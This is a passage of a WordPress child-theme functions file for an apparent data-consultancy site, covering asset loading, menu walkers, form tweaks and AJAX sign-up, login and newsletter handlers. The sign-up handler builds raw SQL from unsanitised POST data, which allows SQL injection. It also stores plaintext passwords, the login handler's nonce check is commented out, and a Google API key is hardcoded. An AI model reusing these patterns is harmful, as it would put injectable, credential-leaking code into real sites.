<?php
if (is_user_logged_in()) {
    show_admin_bar(true);
}

add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles', 11);
function my_theme_enqueue_styles()
{
    wp_dequeue_style('twentytwenty-style');
    wp_dequeue_style('global-styles-inline-css');
    wp_enqueue_style('child-style', get_stylesheet_uri());
}
//Remove Gutenberg Block Library CSS from loading on the frontend
function try_remove_wp_block_library_css()
{
    wp_dequeue_style('wp-block-library');
    wp_dequeue_style('wp-block-library-theme');
    wp_dequeue_style('wc-block-style'); // Remove WooCommerce block CSS
    wp_dequeue_style('global-styles'); // Remove theme.json
}
add_action('wp_enqueue_scripts', 'try_remove_wp_block_library_css', 100);
function add_additional_class_on_li($classes, $item, $args)
{
    if (isset($args->add_li_class)) {
        $classes[] = $args->add_li_class;
    }
    return $classes;
}
add_filter('nav_menu_css_class', 'add_additional_class_on_li', 1, 3);

if (function_exists('acf_add_options_page')) {

    acf_add_options_page(array(

        'page_title' => 'Theme General Settings',

        'menu_title' => 'Theme Settings',

        'menu_slug' => 'theme-general-settings',

        'capability' => 'edit_posts',

        'redirect' => false,

    ));
}



class Child_Wrap extends Walker_Nav_Menu
{
    public function start_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = str_repeat("\t", $depth);
        $output .= "\n$indent<div class=\"dropdown-pane expand\" id=\"nav-dropdown\" data-dropdown data-hover=\"true\" data-hover-pane=\"true\" data-position=\"bottom\">\n$indent<ul class=\"grid-x grid-padding-x small-up-1 medium-up-2 large-up-3\">\n";
    }

    public function end_lvl( &$output, $depth = 0, $args = array() ) {
        $indent = str_repeat("\t", $depth);
        $output .= "$indent</ul>\n</div>\n";
    }
}


class CSS_Menu_Maker_Walker extends Walker {

    var $db_fields = array( 'parent' => 'menu_item_parent', 'id' => 'db_id' );

    function start_lvl( &$output, $depth = 0, $args = array() ) {

      $indent = str_repeat( "\t", $depth );
      if( $depth===0){
          $output .= "\n$indent<ul role=\"menu\" class=\"wsmenu\">\n";
      }else if( $depth===1){
          $output .= "\n$indent<ul role=\"menu\" class=\" wsmenu-submenu\">\n";
      }else if( $depth===2){
          $output .= "\n$indent<ul role=\"menu\" class=\"wsmenu-submenu-sub\">\n";
      }else{
          $output .= "\n$indent<ul role=\"menu\" class=\" wsmenutest\">\n";
      }

    }

    function end_lvl( &$output, $depth = 0, $args = array() ) {
      $indent = str_repeat("\t", $depth);
      $output .= "$indent</ul>\n";
    }

    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {

      global $wp_query;
      $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
      $class_names = $value = '';
      $classes = empty( $item->classes ) ? array() : (array) $item->classes;

      /* Add active class */
      if(in_array('current-menu-item', $classes)) {
        $classes[] = 'active';
        unset($classes['current-menu-item']);
      }

      /* Check for children */
      $children = get_posts(array('post_type' => 'nav_menu_item', 'nopaging' => true, 'numberposts' => 1, 'meta_key' => '_menu_item_menu_item_parent', 'meta_value' => $item->ID));
      if (!empty($children)) {
        $classes[] = 'has-sub';
      }

      $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
      $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

      $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
      $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';

      $output .= $indent . '<li' . $id . $value . $class_names .'>';

      $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
      $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
      $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
      $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

      $item_output = $args->before;
      $item_output .= '<a'. $attributes .'><span>';
      $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
      $item_output .= '</span></a>';
      $item_output .= $args->after;

      $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
    }

    function end_el( &$output, $item, $depth = 0, $args = array() ) {
      $output .= "</li>\n";
    }
}



function my_acf_init()
{
    acf_update_setting('google_api_key', 'AIzaSyAOyuJmybO7eA1ADvXVxnYgycDbJAa92SY&callback');
}

add_action('acf/init', 'my_acf_init');

add_theme_support('post-thumbnails');
add_image_size('single-post-thumbnail');
add_image_size('single-post', 800, 1000);



add_action('save_post', 'add_title_as_category');

function add_title_as_category($postid)
{
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return;
    $post = get_post($postid);
    if ($post->post_type == 'our_services') { // change 'post' to any cpt you want to target
        $term = get_term_by('slug', $post->post_name, 'category');
        if (empty($term)) {
            $add = wp_insert_term($post->post_title, 'category', array('slug' => $post->post_name));
            if (is_array($add) && isset($add['term_id'])) {
                wp_set_object_terms($postid, $add['term_id'], 'category', true);
            }
        }
    }
}

add_filter('wpcf7_form_elements', function ($content) {
    $content = preg_replace('/<(span).*?class="\s*(?:.*\s)?wpcf7-form-control-wrap(?:\s[^"]+)?\s*"[^\>]*>(.*)<\/\1>/i', '\2', $content);

    return $content;
});

add_filter('wpcf7_form_action_url', 'remove_unit_tag');

function remove_unit_tag($url)
{
    $remove_unit_tag = explode('#', $url);
    $new_url = $remove_unit_tag[0];
    return $new_url;
}


function onyxdata_home_enqueue_scripts()
{
    $verson = '1.3.2';
    wp_register_style('bootstrap-bundle-css', 'https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css', array(), $verson);
        wp_enqueue_style('bootstrap-bundle-css');
	
	wp_register_style('fancybox-css', 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css', array(), $verson);
        wp_enqueue_style('fancybox-css');

    wp_register_style('fancybox-app-css', 'https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/panzoom.css', array(), $verson);
        wp_enqueue_style('fancybox-app-css');

	
    if (is_page('home')) {
        wp_register_style('onyxdata_home_css', get_stylesheet_directory_uri() . '/assets/css/home.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_home_css');

        wp_register_style('onyxdata_carousel_css', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_carousel_css');

        // wp_register_style('onyxdata_aos_css', 'https://unpkg.com/aos@next/dist/aos.css', array(), $verson);
        // wp_enqueue_style('onyxdata_aos_css');
    } elseif (is_page('about-us')) {
        wp_register_style('onyxdata_about_css', get_stylesheet_directory_uri() . '/assets/css/about.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_about_css');
        wp_register_style('onyxdata_carousel_css', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_carousel_css');
    } elseif (is_page('data-dna-data-visualization-gallery')) {
        wp_register_style('onyxdata_visualization', get_stylesheet_directory_uri() . '/assets/css/data-dna-gallery.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_visualization');
    } elseif (is_page('services')) {
        wp_register_style('onyxdata_services_css', get_stylesheet_directory_uri() . '/assets/css/services.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_services_css');
    } elseif (is_singular('servicess')) {
        wp_register_style('onyxdata_single-services_css', get_stylesheet_directory_uri() . '/assets/css/finance.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_single-services_css');
        wp_register_style('onyxdata_carousel_css', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_carousel_css');
    } elseif (is_page('training')) {
        wp_register_style('onyxdata_training_css', get_stylesheet_directory_uri() . '/assets/css/training.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_training_css');
    } elseif (is_singular('trainings')) {
        wp_register_style('onyxdata_single-training_css', get_stylesheet_directory_uri() . '/assets/css/single-training.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_single-training_css');
        wp_register_style('onyxdata_carousel_css', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_carousel_css');

    } elseif (is_page('case-studies')) {
        wp_register_style('onyxdata_case-studies_css', get_stylesheet_directory_uri() . '/assets/css/case-studies.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_case-studies_css');
    } elseif (is_page('careers')) {
        wp_register_style('onyxdata_careers_css', get_stylesheet_directory_uri() . '/assets/css/dataset-archive.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_careers_css');
    }
    // $page_slug = get_post_field( 'uk-property-market-intelligence' );
    elseif (is_singular('case_studie')) {
        wp_register_style('onyxdata_single-case_studie_css', get_stylesheet_directory_uri() . '/assets/css/case-studies.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_single-case_studie_css');
    } elseif (is_page('data-dna')) {
        wp_register_style('onyxdata_data-dna_css', get_stylesheet_directory_uri() . '/assets/css/data-dna.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_data-dna_css');
    } elseif (is_page('contact-us')) {
        wp_register_style('onyxdata_contact-us_css', get_stylesheet_directory_uri() . '/assets/css/contact-us.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_contact-us_css');
    } elseif (is_category('data-dna')) {
        wp_register_style('onyxdata_data', get_stylesheet_directory_uri() . '/assets/css/data-dna.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_data');
    } elseif (is_singular('post')) {
        wp_register_style('onyxdata_data-dna_css', get_stylesheet_directory_uri() . '/assets/css/data-dna.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_data-dna_css');
    } elseif (is_singular('blog')) {
        wp_register_style('onyxdata_single-blog_css', get_stylesheet_directory_uri() . '/assets/css/single-blog.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_single-blog_css');
        //
        wp_register_style('onyxdata_data-dna_css', get_stylesheet_directory_uri() . '/assets/css/data-dna.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_data-dna_css');
    } elseif (is_page('data-dna-dataset-challenge/datadna-dataset-archive')) {
        wp_register_style('onyxdata_dataset-archive_css', get_stylesheet_directory_uri() . '/assets/css/dataset-archive.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_dataset-archive_css');
    } elseif (is_page('profile') || is_author()) {
        wp_register_style('profile_css', get_stylesheet_directory_uri() . '/assets/css/profile.min.css', array(), $verson);
        wp_enqueue_style('profile_css');
    } elseif (is_page('create-project') || is_page('edit-project')) {
        wp_register_style('profile_css', get_stylesheet_directory_uri() . '/assets/css/profile.min.css', array(), $verson);
        wp_enqueue_style('profile_css');
    } elseif (is_page('project-details') || is_singular('projects')) {
        wp_register_style('profile_css', get_stylesheet_directory_uri() . '/assets/css/profile.min.css', array(), $verson);
        wp_enqueue_style('profile_css');
    } elseif (is_page('edit-profile')) {
        wp_register_style("iup_toastercss", 'https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css', array('jquery'), '1.0.0', true);
        wp_enqueue_style('iup_toastercss');
        wp_register_style('profile_css', get_stylesheet_directory_uri() . '/assets/css/profile.min.css', array(), $verson);
        wp_enqueue_style('profile_css');

       
    } elseif (is_page('projects') || is_singular('projects')) {
        wp_register_style('profile_css', get_stylesheet_directory_uri() . '/assets/css/profile.min.css', array(), $verson);
        wp_enqueue_style('profile_css');
        wp_register_style('onyxdata_carousel_css', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_carousel_css');
    }
    elseif (is_page('data-dna-dataset-challenge')) {
        wp_register_style('onyxdata_dataset-challenge', get_stylesheet_directory_uri() . '/assets/css/dataset-challenge.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_dataset-challenge');
        wp_register_style('onyxdata_carousel_css', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_carousel_css');

    } elseif (is_singular('dataset_challenge')) {
        wp_register_style('onyxdata_single-dataset-challange_css', get_stylesheet_directory_uri() . '/assets/css/single-dataset-challenge.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_single-dataset-challange_css');
        //remove css when page css ready
        wp_register_style('onyxdata_dataset-challenge', get_stylesheet_directory_uri() . '/assets/css/dataset-challenge.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_dataset-challenge');
        wp_register_style('onyxdata_carousel_css', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_carousel_css');
        wp_register_style('onyxdata_downloadreport_css', get_stylesheet_directory_uri() . '/assets/css/downloadreport.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_downloadreport_css');
    } elseif (is_page('download-power-bi-report-templates')) {
        wp_register_style('onyxdata_downloadreport_css', get_stylesheet_directory_uri() . '/assets/css/downloadreport.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_downloadreport_css');
    } elseif (is_page('privacy-policy')) {
        wp_register_style('onyxdata_privacy_css', get_stylesheet_directory_uri() . '/assets/css/privacy.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_privacy_css');
    } elseif (is_active_sidebar('sidebar-2')) {
        wp_register_style('onyxdata_data', get_stylesheet_directory_uri() . '/assets/css/data-dna.min.css', array(), $verson);
        wp_enqueue_style('onyxdata_data');
    }
}
add_action('wp_enqueue_scripts', 'onyxdata_home_enqueue_scripts');


add_action('wp_enqueue_scripts', 'common_script_enqueuer');
function common_script_enqueuer()
{
    // global $post;
    // wp_register_script("main-js", 'https://code.jquery.com/jquery-3.6.0.min.js', '', '', true);
    // wp_enqueue_script('main-js');
    wp_register_script("bootstrap-bundle", 'https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js', '', '', true);
    wp_enqueue_script('bootstrap-bundle');
	
	wp_register_script("fancybox-umd", 'https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js', '', '', true);
    wp_enqueue_script('fancybox-umd');

    wp_register_script("owl-carousel", get_stylesheet_directory_uri() . '/assets/script/owl.carousel.min.js', array('jquery'), '1.0.0', true);
        wp_enqueue_script('owl-carousel');

    if (is_page('home')) {
         wp_register_script("owl-carousel", get_stylesheet_directory_uri() . '/assets/script/owl.carousel.min.js', array('jquery'), '1.0.0', true);
         wp_enqueue_script('owl-carousel');
         // wp_register_script("aos-script", 'https://unpkg.com/aos@next/dist/aos.js', '', '', true);
        // wp_enqueue_script('aos-script');
        // wp_register_script("js-min", get_stylesheet_directory_uri() . '/assets/script/jquery-3.6.1.min.js', array('jquery'), '1.0.0', true);
        // wp_enqueue_script('js-min');

        // wp_register_script("home-script", get_stylesheet_directory_uri() . '/assets/script/script.js', array('jquery'), '1.0.0', true);
        // wp_enqueue_script('home-script');
        // wp_register_script("lazy-load", get_stylesheet_directory_uri() . '/assets/js/jquery.lazy.min.js', array('jquery'), '1.0.0', true);
        // wp_enqueue_script('lazy-load');

    } else if (is_page('about-us')) {
        wp_register_script("chartjs", 'https://d3js.org/d3.v3.min.js', '', '', true);
        wp_enqueue_script('chartjs');
        wp_register_script("about-script-js", get_stylesheet_directory_uri() . '/assets/js/about-script.js', array('jquery'), '1.0.0', true);
        wp_enqueue_script('about-script-js');
    } else if (is_page('data-dna-dataset-challenge') || is_singular('dataset_challenge')) {
        wp_register_script("owl-carousel", get_stylesheet_directory_uri() . '/assets/js/owl.carousel.min.js', array('jquery'), '1.0.0', true);
        wp_enqueue_script('owl-carousel');


    } else if (is_page('contact-us')) {
        wp_register_script('aa_js_googlemaps_script', 'https://maps.googleapis.com/maps/api/js?v=3.exp&key=AIzaSyAOyuJmybO7eA1ADvXVxnYgycDbJAa92SY'); // with Google Maps API fix
        wp_enqueue_script('aa_js_googlemaps_script');
    } else if (is_page('training') || is_singular('trainings')) {

        // wp_register_script("main-js", get_stylesheet_directory_uri() . 'assets/script/jquery-3.6.1.min.js', '', '', true);
        // wp_enqueue_script('main-js');
        wp_register_script("owl-carousel", get_stylesheet_directory_uri() . '/assets/script/owl.carousel.min.js', array('jquery'), '1.0.0', true);
        wp_enqueue_script('owl-carousel');

        wp_register_script("training-single-script-js", get_stylesheet_directory_uri() . '/assets/script/training.js', array('jquery'), '1.0.0', true);
        wp_enqueue_script('training-single-script-js');

    } else if (is_singular('servicess')) {
        wp_register_script("owl-carousel", get_stylesheet_directory_uri() . '/assets/script/owl.carousel.min.js', array('jquery'), '1.0.0', true);
        wp_enqueue_script('owl-carousel');

        wp_register_script("servicess-single-script-js", get_stylesheet_directory_uri() . '/assets/script/finance.js', array('jquery'), '1.0.0', true);
        wp_enqueue_script('servicess-single-script-js');

    }else {

        wp_register_script("common-script-js", get_stylesheet_directory_uri() . '/assets/js/common-script.js', array('jquery'), '1.0.0', true);
        wp_enqueue_script('common-script-js');
    }

    wp_register_script("home-script", get_stylesheet_directory_uri() . '/assets/script/script.js', array('jquery'), '1.0.0', true);
    wp_enqueue_script('home-script');

     wp_register_script("sign_up_con", get_stylesheet_directory_uri() . '/assets/script/request.js', array('jquery'), '1.0.0', true);
    wp_enqueue_script('sign_up_con');
    wp_localize_script('sign_up_con', 'customAjax', array('ajaxurl' => admin_url('admin-ajax.php')));


}

add_filter('wpseo_breadcrumb_links', 'wpse_100012_override_yoast_breadcrumb_trail');

function wpse_100012_override_yoast_breadcrumb_trail($links)
{
    global $post;

    if (is_singular('post')) {
        $breadcrumb[] = array(
            // 'url' => get_permalink( get_option( 'page_for_posts' ) ),
            'url' => home_url('/data-dna/blog/'),
            'text' => 'Blog',
        );

        array_splice($links, 1, -2, $breadcrumb);
    }

    return $links;
}




/**
 * Custom script
 */
// function my_scripts_method()
// {
//     wp_enqueue_script(
//         'custom-script',
//         get_stylesheet_directory_uri() . '/js/main.js',
//         array('jquery'),
//         '1.2'
//     );

//     if (!is_admin()) {
//         /** */
//         wp_localize_script('custom-script', 'ajax', array(
//             'url' =>            admin_url('admin-ajax.php'),
//             'ajax_nonce' =>     wp_create_nonce('noncy_nonce'),
//             'assets_url' =>     get_stylesheet_directory_uri(),
//         ));
//     }
// }
// add_action('wp_enqueue_scripts', 'my_scripts_method');

/**
 * Ajax newsletter
 *
 * @url http://www.thenewsletterplugin.com/forums/topic/ajax-subscription
 */
function realhero_ajax_subscribe()
{
    check_ajax_referer('noncy_nonce', 'nonce');
    $data = urldecode($_POST['data']);

    if (!empty($data)) :
        $data_array = explode("&", $data);
        $fields = [];
        foreach ($data_array as $array) :
            $array = explode("=", $array);
            $fields[$array[0]] = $array[1];
        endforeach;
    endif;

    if (!empty($fields)) :
        global $wpdb;

        // check if already exists

        /** @var int $count **/
        $count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM {$wpdb->prefix}newsletter WHERE email = %s", $fields['ne']));

        if ($count > 0) {
            $output = array(
                'status'    => 'error',
                'msg'       => __('Already in a database.', THEME_NAME)
            );
        } elseif (!defined('NEWSLETTER_VERSION')) {
            $output = array(
                'status'    => 'error',
                'msg'       => __('Please install & activate newsletter plugin.', THEME_NAME)
            );
        } else {
            /**
             * Generate token
             */

            /** @var string $token */
            $token =  wp_generate_password(rand(10, 50), false);


            $wpdb->insert(
                $wpdb->prefix . 'newsletter',
                array(
                    'email'         => $fields['ne'],
                    'status'        => $fields['na'],
                    'http_referer'  => $fields['nhr'],
                    'token'         => $token,
                )
            );

            $opts = get_option('newsletter');

            $opt_in = (int) $opts['noconfirmation'];

            // This means that double opt in is enabled
            // so we need to send activation e-mail
            if ($opt_in == 0) {
                $newsletter = Newsletter::instance();
                $user = NewsletterUsers::instance()->get_user($wpdb->insert_id);

                NewsletterSubscription::instance()->mail($user->email, $newsletter->replace($opts['confirmation_subject'], $user), $newsletter->replace($opts['confirmation_message'], $user));
            }

            $output = array(
                'status'    => 'success',
                'msg'       => __('Thank you!', THEME_NAME)
            );
        }

    else :
        $output = array(
            'status'    => 'error',
            'msg'       => __('An Error occurred. Please try again later.', THEME_NAME)
        );
    endif;

    wp_send_json($output);
}
add_action('wp_ajax_realhero_subscribe', 'realhero_ajax_subscribe');
add_action('wp_ajax_nopriv_realhero_subscribe', 'realhero_ajax_subscribe');







// function your_submenu_class($menu) {

//     $menu = preg_replace('/ class="sub-menu"/','/ class="sub-menu 1" /',$menu);

//     return $menu;

//     }

// add_filter('wp_nav_menu','your_submenu_class');


// add_filter('nav_menu_css_class' , 'v123_nav_class' , 10 , 2 );
// function v123_nav_class ($classes, $item) {
//     if (in_array('sub-menu 1', $classes) ){
//         $classes[] = 'sub-menu 2';
//     }
//     return $classes;
// }
class UL_Class_Walker extends Walker_Nav_Menu {
     function start_lvl(&$output, $depth = 0, $args = array()) {
      $indent = str_repeat("\t", $depth);
      $output .= "\n$indent<ul class=\"submenu level-".$depth."\">\n";
    }
  }


//   add_filter( 'post_gallery', function( $html, $attr, $instance )
// {
//     add_filter( 'gallery_style', function( $html ) use ( $attr )
//     {
//         if( isset( $attr['class'] ) && $class = $attr['class'] )
//         {
//             unset( $attr['class'] );

//             // Modify & replace the current class attribute
//             $html = str_replace(
//                 "class='gallery ",
//                 sprintf(
//                     "class='gallery row ",
//                     esc_attr( $class )
//                 ),
//                 $html
//             );
//         }
//         return $html;
//     } );

//     return $html;
// }, 10 ,3 );


add_filter('post_gallery','customFormatGallery',10,2);
function customFormatGallery($string,$attr){
    $output = "<div class=\"row\">";
    $posts = get_posts(array('include' => $attr['ids'],'post_type' => 'attachment'));
    foreach($posts as $imagePost){
        $output .= "<div class=\"col-xxl-4 col-xl-4 col-lg-6 col-md-6 col-sm-12 col-12\"><a class=\"noclass\" href='".wp_get_attachment_image_src($imagePost->ID, 'onyx-large')[0]."'><img class=\"img-class\" src='".wp_get_attachment_image_src($imagePost->ID, 'onyx-medium')[0]."'></a></div>";
    }
    $output .= "<div class=\"clear\"></div></div>";
    return $output;
}


// Callback function to insert 'styleselect' into the $buttons array
function my_mce_buttons_2($buttons) {
    array_unshift($buttons, 'styleselect');
    return $buttons;
}

// Register our callback to the appropriate filter
add_filter('mce_buttons_2', 'my_mce_buttons_2');

function my_mce_before_init_insert_formats($init_array) {
// Define the style_formats array
    $style_formats = array(
        // Each array child is a format with it's own settings
        array(
            'title' => 'Some Class',
            'inline' => 'span',
            'classes' => 'someclass'
        ),
    );
    // Insert the array, JSON ENCODED, into 'style_formats'
    $init_array['style_formats'] = json_encode($style_formats);
    return $init_array;
}

// Attach callback to 'tiny_mce_before_init'
add_filter('tiny_mce_before_init', 'my_mce_before_init_insert_formats');

function add_meta_js_snippet(){
	?>
<script type="text/javascript">
var wpcf7Elm = document.querySelector('.wpcf7');
wpcf7Elm.addEventListener('wpcf7mailsent', function(event) {
  dataLayer.push({
    'event': 'formSubmitted'
  });
  fbq('track', 'CompleteRegistration');
}, false);
</script>
<?php
}
add_action( 'wp_head', 'add_meta_js_snippet' );


//iGex-20-DEC-2023

//sign up
add_action('wp_ajax_sign_up_form', 'sign_up_form');
add_action('wp_ajax_nopriv_sign_up_form', 'sign_up_form');
function sign_up_form()
{
    global $wpdb;
    $table = 'wp_users';

    $user_email = $_POST['user_email'];
    $user_pass = $_POST['user_pass'];
    $c_password = $_POST['c_password'];

    if (email_exists(sanitize_email($_POST['email'])))
	{
		echo json_encode(array('result'=>false, 'message'=>__('Email address already exists, redirecting...')));
		exit;
	}


    $sql = "INSERT INTO $table (user_email, user_pass, c_password)
          VALUES ('$user_email', '$user_pass', '$c_password')";

    $result = $wpdb->query($sql);

    $userInfo = array(
		'user_login' => $user_email,
		'user_pass' => sanitize_text_field($_POST['user_pass']) ,
		'user_email' => $user_email,
		'role' => 'subscriber'
	);

    $user_id = wp_insert_user($userInfo);
    echo json_encode(array('result'=>true, 'message'=>__('Registration successful, redirecting...')));
    die();
}

function my_login_redirect( $redirect_to, $request, $user ) {
    //is there a user to check?
    global $user;
    if ( isset( $user->roles ) && is_array( $user->roles ) ) {

        if ( in_array( 'subscriber', $user->roles ) ) {
            // redirect them to the default place

            return home_url();
        }
    }
    return $redirect_to;
}
add_filter( 'login_redirect', 'my_login_redirect', 10, 3 );






// login wordpress
function ajax_login_init(){

    wp_register_script('ajax-login-script', get_stylesheet_directory_uri() . '/assets/script/loginf.js', array('jquery') );
    wp_enqueue_script('ajax-login-script');

    wp_localize_script( 'ajax-login-script', 'ajax_login_object', array(
        'ajaxurl' => admin_url( 'admin-ajax.php' ),
        'redirecturl' => home_url(),
        'loadingmessage' => __('Sending user info, please wait...')
    ));

    // Enable the user with no privileges to run ajax_login() in AJAX

}

// Execute the action only if the user isn't logged in
//if (!is_user_logged_in()) {
    add_action('init', 'ajax_login_init');
//}

add_action( 'wp_ajax_nopriv_ajaxlogin', 'ajax_login' );

function ajax_login(){
    // First check the nonce, if it fails the function will break
    //check_ajax_referer( 'ajax-login-nonce', 'security' );

    // Nonce is checked, get the POST data and sign user on
    $info = array();
    $info['user_login'] = $_POST['user_email'];
    $info['user_password'] = $_POST['user_pass'];
    $info['remember'] = true;

    $user_signon = wp_signon( $info, false );
    if ( is_wp_error($user_signon) ){
        echo json_encode(array('loggedin'=>false, 'message'=>__('Wrong username or password.')));
    } else {
        echo json_encode(array('loggedin'=>true, 'message'=>__('Login successful, redirecting...')));
    }

    die();
}


function kp_display_post_view_count($post_id){

    $options = Post_Views_Counter()->options['display'];
    $label = apply_filters( 'pvc_post_views_label', ( function_exists( 'icl_t' ) ? icl_t( 'Post Views Counter', 'Post Views Label', $options['label'] ) : $options['label'] ), $post_id );

    // add dashicons class if needed
    $icon_class = strpos( $options['icon_class'], 'dashicons' ) === false ? $options['icon_class'] : 'dashicons ' . $options['icon_class'];

    // prepare icon output
    $icon = apply_filters( 'pvc_post_views_icon', '<span class="post-views-icon ' . esc_attr( $icon_class ) . '"></span> ', $post_id );

    $views = pvc_get_post_views( $post_id, $options['display_period'] );
    return $icon.''.$views.' '.$label;
}

add_filter( 'manage_media_columns', 'set_custom_edit_attachment_columns' );
function set_custom_edit_attachment_columns($columns) {
    unset($columns['date']);
    unset($columns['comments']);
    return array_merge(
        $columns,
        array(
            '_od_image_year' => __('Year', 'kp_custom_media_field'),
            '_od_image_month' => __('Month', 'kp_custom_media_field'),
            '_od_image_dataset' => __('Dataset', 'kp_custom_media_field'),
            '_od_image_rank' => __('Rank', 'kp_custom_media_field'),
        )
    );
}

add_action( 'manage_media_custom_column' , 'custom_attachment_column', 10, 2 );
function custom_attachment_column( $column, $post_id ) {
    switch ( $column ) {
    case '_od_image_year' :
    echo get_post_meta( $post_id , '_od_image_year' , true );
    break;

    case '_od_image_month' :
    echo get_post_meta( $post_id , '_od_image_month' , true );
    break;

    case '_od_image_dataset' :
    echo get_post_meta( $post_id , '_od_image_dataset' , true );
    break;

    case '_od_image_rank' :
    echo get_post_meta( $post_id , '_od_image_rank' , true );
    break;

    }
}

add_filter( 'manage_upload_sortable_columns', 'cutify_media_columns_sortable' );
function cutify_media_columns_sortable( $columns )
{
    // 'date'     => array( 'comment_count', __( 'Comments' ), false, __( 'Table ordered by Comments.' ) );
    $columns['_od_image_month'] = array( '_od_image_month', __( 'Month' ), false, __( 'Table ordered by Month.' ) );
    $columns['_od_image_year'] = array( '_od_image_year', __( 'Year' ), false, __( 'Table ordered by Year.' ) );
    $columns['_od_image_dataset'] = array( '_od_image_dataset', __( 'Year' ), false, __( 'Table ordered by Dataset.' ) );
    $columns['_od_image_rank'] = array( '_od_image_rank', __( 'Year' ), false, __( 'Table ordered by Rank.' ) );
    return $columns;
}
function custom_search_query( $query ) {
    if ( isset($query->query_vars['orderby']) && !empty($query->query_vars['orderby']) ) {  
        if ($query->query_vars['orderby'] == '_od_image_month') {
            $query->set('meta_query', array(
                'relation' => 'OR',
                array(
                    'key' => '_od_image_month',
                    'compare' => 'NOT EXISTS'
                ),
                array(
                    'key' => '_od_image_month',
                    'compare' => 'EXISTS'
                ),
            ));
            $query->set('orderby', '_od_image_month');
        }

        if ($query->query_vars['orderby'] == '_od_image_year') {
            $query->set('meta_query', array(
                'relation' => 'OR',
                array(
                    'key' => '_od_image_year',
                    'compare' => 'NOT EXISTS'
                ),
                array(
                    'key' => '_od_image_year',
                    'compare' => 'EXISTS'
                ),
            ));
            $query->set('orderby', '_od_image_year');
        }

        if ($query->query_vars['orderby'] == '_od_image_dataset') {
            $query->set('meta_query', array(
                'relation' => 'OR',
                array(
                    'key' => '_od_image_dataset',
                    'compare' => 'NOT EXISTS'
                ),
                array(
                    'key' => '_od_image_dataset',
                    'compare' => 'EXISTS'
                ),
            ));
            $query->set('orderby', '_od_image_dataset');
        }

        if ($query->query_vars['orderby'] == '_od_image_rank') {
            $query->set('meta_query', array(
                'relation' => 'OR',
                array(
                    'key' => '_od_image_rank',
                    'compare' => 'NOT EXISTS'
                ),
                array(
                    'key' => '_od_image_rank',
                    'compare' => 'EXISTS'
                ),
            ));
            $query->set('orderby', '_od_image_rank');
        }
    }

    if ($query->is_search() && isset($query->query_vars['s']) && !empty($query->query_vars['s'])) {
        $result = $query->query_vars['s'];
        $query->query_vars['s'] = '';
        $query->set('meta_query', array(
            'relation' => 'OR',
            array(
                'key'     => '_od_image_month', // ACF FIELD NAME OR POST META
                'value'   => $result,
                'compare' => 'LIKE',
            )
        ));
    }
}
//add_action('pre_get_posts', 'custom_search_query');

//add_filter( 'pre_get_posts', 'custom_search_query');

add_action('admin_menu', 'register_my_custom_submenu_page');

function register_my_custom_submenu_page() {
    add_submenu_page(
        'upload.php',
        'Import Media Metadata',
        'Import Media Metadata',
        'manage_options',
        'kp-import-medial-metadata',
        'my_custom_submenu_page_content' );
}

function my_custom_submenu_page_content() {
    // require_once __DIR__ . '/admin.php';
    // require_once("../../../wp-admin/admin.php");
